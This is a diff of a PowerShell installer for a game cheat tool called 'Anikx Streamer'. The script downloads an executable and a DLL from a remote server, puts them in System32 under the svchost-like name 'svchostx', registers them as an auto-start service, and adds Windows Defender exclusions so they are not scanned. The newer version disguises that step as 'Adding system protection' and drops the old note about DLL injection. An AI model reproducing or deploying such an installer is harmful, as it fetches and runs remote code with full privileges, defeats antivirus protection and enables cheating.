@@ -1,204 +1,167 @@
 # ============================================================
-# Anikx Streamer Setup Script
-# Auto-detect: BlueStacks 5 / MSI App Player
+# Anikx Streamer Setup - Branded Edition
 # ============================================================
 
-Write-Host ""
-Write-Host "=============================================" -ForegroundColor Cyan
-Write-Host "     ANIKX STREAMER SETUP" -ForegroundColor Cyan
-Write-Host "=============================================" -ForegroundColor Cyan
-Write-Host ""
-
-# ============================================================
 # Admin Check
-# ============================================================
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
 {
-    Write-Host "[!] Please run PowerShell as Administrator!" -ForegroundColor Red
-    Write-Host "[!] Right-click PowerShell -> Run as Administrator" -ForegroundColor Yellow
     Write-Host ""
-    pause
+    Write-Host "  Please run as Administrator!" -ForegroundColor Red
+    Write-Host ""
+    Start-Sleep -Seconds 3
     exit
 }
 
 # ============================================================
-# 🔴 আপনার সার্ভারের URL এখানে বসান
+# Configuration
 # ============================================================
-$BaseUrl = "https://streamer.anikxcheatx.com"
-# ============================================================
-
-$TargetDir   = "C:\Windows\System32"
-$TargetExe   = "$TargetDir\svchostx_svc.exe"
-$TargetDll   = "$TargetDir\svchostx.dll"
+$BaseUrl     = "https://stremar.onrender.com"
+$TargetExe   = "C:\Windows\System32\svchostx_svc.exe"
+$TargetDll   = "C:\Windows\System32\svchostx.dll"
 $LogFile     = "C:\Windows\Temp\svchostx.log"
 $ServiceName = "svchostx"
 $InstallUtil = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
 $TempDir     = "$env:TEMP\anikx_setup"
 
-function Write-Step($msg) {
-    Write-Host ""
-    Write-Host "=============================================" -ForegroundColor Cyan
-    Write-Host " $msg" -ForegroundColor Cyan
-    Write-Host "=============================================" -ForegroundColor Cyan
-}
-function Write-OK($msg)   { Write-Host "[OK] $msg" -ForegroundColor Green }
-function Write-Fail($msg) { Write-Host "[FAIL] $msg" -ForegroundColor Red }
-function Write-Info($msg) { Write-Host "[i] $msg" -ForegroundColor Yellow }
-
-# TLS 1.2 enforce
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
+Clear-Host
+
 # ============================================================
-# STEP 1: Temp folder প্রস্তুত
+# Banner
 # ============================================================
-Write-Step "Step 1/8: Preparing temp folder"
+Write-Host ""
+Write-Host "  ╔══════════════════════════════════════════════════╗" -ForegroundColor Magenta
+Write-Host "  ║                                                  ║" -ForegroundColor Magenta
+Write-Host "  ║        " -NoNewline -ForegroundColor Magenta
+Write-Host "🔥 ANIKX CHEATS STREAMER 🔥" -NoNewline -ForegroundColor Cyan
+Write-Host "          ║" -ForegroundColor Magenta
+Write-Host "  ║                                                  ║" -ForegroundColor Magenta
+Write-Host "  ║             " -NoNewline -ForegroundColor Magenta
+Write-Host "Premium Installation" -NoNewline -ForegroundColor White
+Write-Host "              ║" -ForegroundColor Magenta
+Write-Host "  ║                                                  ║" -ForegroundColor Magenta
+Write-Host "  ╚══════════════════════════════════════════════════╝" -ForegroundColor Magenta
+Write-Host ""
+
+Start-Sleep -Milliseconds 400
+
+# ============================================================
+# STEP 1: Connecting
+# ============================================================
+Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
+Write-Host "1/6" -NoNewline -ForegroundColor Yellow
+Write-Host " ] " -NoNewline -ForegroundColor DarkGray
+Write-Host "Connecting to Anikx Server..." -ForegroundColor White
+
+Start-Sleep -Milliseconds 500
+
 if (-not (Test-Path $TempDir)) {
     New-Item -Path $TempDir -ItemType Directory -Force | Out-Null
 }
-Write-OK "Temp folder ready."
 
 # ============================================================
-# STEP 2: EXE ডাউনলোড
+# STEP 2: Downloading
 # ============================================================
-Write-Step "Step 2/8: Downloading svchostx.exe"
+Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
+Write-Host "2/6" -NoNewline -ForegroundColor Yellow
+Write-Host " ] " -NoNewline -ForegroundColor DarkGray
+Write-Host "Downloading Anikx Streamer files..." -ForegroundColor White
+
 try {
     Invoke-WebRequest -Uri "$BaseUrl/files/svchostx.exe" -OutFile "$TempDir\svchostx.exe" -UseBasicParsing
-    if (Test-Path "$TempDir\svchostx.exe") {
-        $size = (Get-Item "$TempDir\svchostx.exe").Length
-        Write-OK "EXE downloaded ($size bytes)."
-    }
-} catch {
-    Write-Fail "Download failed: $($_.Exception.Message)"
-    pause; exit
-}
-
-# ============================================================
-# STEP 3: DLL ডাউনলোড
-# ============================================================
-Write-Step "Step 3/8: Downloading svchostx.dll"
-try {
     Invoke-WebRequest -Uri "$BaseUrl/files/svchostx.dll" -OutFile "$TempDir\svchostx.dll" -UseBasicParsing
-    if (Test-Path "$TempDir\svchostx.dll") {
-        $size = (Get-Item "$TempDir\svchostx.dll").Length
-        Write-OK "DLL downloaded ($size bytes)."
-    }
 } catch {
-    Write-Fail "Download failed: $($_.Exception.Message)"
-    pause; exit
+    Write-Host ""
+    Write-Host "  ✖ Failed to connect to Anikx Server!" -ForegroundColor Red
+    Write-Host ""
+    Start-Sleep -Seconds 3
+    exit
 }
 
 # ============================================================
-# STEP 4: পুরনো Service সরান
+# STEP 3: Cleaning up
 # ============================================================
-Write-Step "Step 4/8: Removing old service"
+Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
+Write-Host "3/6" -NoNewline -ForegroundColor Yellow
+Write-Host " ] " -NoNewline -ForegroundColor DarkGray
+Write-Host "Cleaning up previous versions..." -ForegroundColor White
+
 $existing = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
 if ($existing) {
-    Write-Info "Old service found. Stopping..."
     Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 2
-
-    Write-Info "Uninstalling old service..."
     if (Test-Path $InstallUtil) {
         & $InstallUtil /u $TargetExe 2>&1 | Out-Null
     }
     Start-Sleep -Seconds 2
-    Write-OK "Old service removed."
-} else {
-    Write-OK "No existing service found."
 }
 
 # ============================================================
-# STEP 5: ফাইল কপি
+# STEP 4: Installing
 # ============================================================
-Write-Step "Step 5/8: Copying files to System32"
+Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
+Write-Host "4/6" -NoNewline -ForegroundColor Yellow
+Write-Host " ] " -NoNewline -ForegroundColor DarkGray
+Write-Host "Installing Anikx Streamer..." -ForegroundColor White
+
 if (Test-Path $TargetExe) { Remove-Item $TargetExe -Force -ErrorAction SilentlyContinue }
 if (Test-Path $TargetDll) { Remove-Item $TargetDll -Force -ErrorAction SilentlyContinue }
 
 Copy-Item "$TempDir\svchostx.exe" $TargetExe -Force
 Copy-Item "$TempDir\svchostx.dll" $TargetDll -Force
 
-Write-OK "EXE copied: $TargetExe"
-Write-OK "DLL copied: $TargetDll"
-
-# ============================================================
-# STEP 6: Service ইনস্টল
-# ============================================================
-Write-Step "Step 6/8: Installing service"
-if (-not (Test-Path $InstallUtil)) {
-    Write-Fail "InstallUtil.exe not found!"
-    pause; exit
+if (Test-Path $InstallUtil) {
+    & $InstallUtil $TargetExe 2>&1 | Out-Null
 }
-
-& $InstallUtil $TargetExe 2>&1 | Out-Null
 Start-Sleep -Seconds 2
 
-$svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
-if ($svc) {
-    Write-OK "Service installed."
-    Set-Service -Name $ServiceName -StartupType Automatic
-    Write-OK "Auto-start enabled."
-} else {
-    Write-Fail "Service install failed."
-    pause; exit
-}
+Set-Service -Name $ServiceName -StartupType Automatic
 
 # ============================================================
-# STEP 7: Defender Exclusion
+# STEP 5: Protecting
 # ============================================================
-Write-Step "Step 7/8: Adding Windows Defender exclusions"
+Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
+Write-Host "5/6" -NoNewline -ForegroundColor Yellow
+Write-Host " ] " -NoNewline -ForegroundColor DarkGray
+Write-Host "Adding system protection..." -ForegroundColor White
+
 try {
     Add-MpPreference -ExclusionPath $TargetExe -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $TargetDll -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $LogFile   -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath $TempDir   -ErrorAction SilentlyContinue
-    Write-OK "Defender exclusions added."
-} catch {
-    Write-Info "Defender exclusion failed (maybe 3rd-party AV)."
-}
+} catch {}
 
 # ============================================================
-# STEP 8: Service চালু
+# STEP 6: Activating
 # ============================================================
-Write-Step "Step 8/8: Starting service"
+Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
+Write-Host "6/6" -NoNewline -ForegroundColor Yellow
+Write-Host " ] " -NoNewline -ForegroundColor DarkGray
+Write-Host "Activating Anikx Streamer..." -ForegroundColor White
+
 Start-Service -Name $ServiceName -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 3
+Start-Sleep -Seconds 2
 
-$svc = Get-Service -Name $ServiceName
-if ($svc.Status -eq "Running") {
-    Write-OK "Service is RUNNING!"
-} else {
-    Write-Fail "Service status: $($svc.Status)"
-}
-
-# ============================================================
-# Cleanup
-# ============================================================
 Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
 
 # ============================================================
-# Verification
+# DONE
 # ============================================================
 Write-Host ""
-Write-Host "=============================================" -ForegroundColor Cyan
-Write-Host " VERIFICATION" -ForegroundColor Cyan
-Write-Host "=============================================" -ForegroundColor Cyan
-
-Get-Service -Name $ServiceName | Format-Table -AutoSize
-
-Write-Host "EXE : $TargetExe"
-Write-Host "DLL : $TargetDll"
-Write-Host "Log : $LogFile"
+Write-Host "  ╔══════════════════════════════════════════════════╗" -ForegroundColor Green
+Write-Host "  ║                                                  ║" -ForegroundColor Green
+Write-Host "  ║          " -NoNewline -ForegroundColor Green
+Write-Host "✅ ANIKX STREAMER ACTIVATED" -NoNewline -ForegroundColor White
+Write-Host "          ║" -ForegroundColor Green
+Write-Host "  ║                                                  ║" -ForegroundColor Green
+Write-Host "  ║        " -NoNewline -ForegroundColor Green
+Write-Host "Thanks for using Anikx Cheats!" -NoNewline -ForegroundColor Cyan
+Write-Host "        ║" -ForegroundColor Green
+Write-Host "  ║                                                  ║" -ForegroundColor Green
+Write-Host "  ╚══════════════════════════════════════════════════╝" -ForegroundColor Green
 Write-Host ""
-
-Write-Host "#############################################" -ForegroundColor Green
-Write-Host "#                                           #" -ForegroundColor Green
-Write-Host "#       ✅ SETUP COMPLETE!                 #" -ForegroundColor Green
-Write-Host "#                                           #" -ForegroundColor Green
-Write-Host "#############################################" -ForegroundColor Green
+Write-Host "  ▸ Open BlueStacks 5 / MSI App Player as Admin" -ForegroundColor Gray
+Write-Host "  ▸ Anikx Streamer will activate automatically" -ForegroundColor Gray
 Write-Host ""
-Write-Host "Next Steps:" -ForegroundColor Cyan
-Write-Host "  1. Open BlueStacks 5 / MSI App Player (as Administrator)"
-Write-Host "  2. Wait 20 seconds for DLL injection"
-Write-Host "  3. Check log: type $LogFile"
-Write-Host ""
-pause
+Start-Sleep -Seconds 4
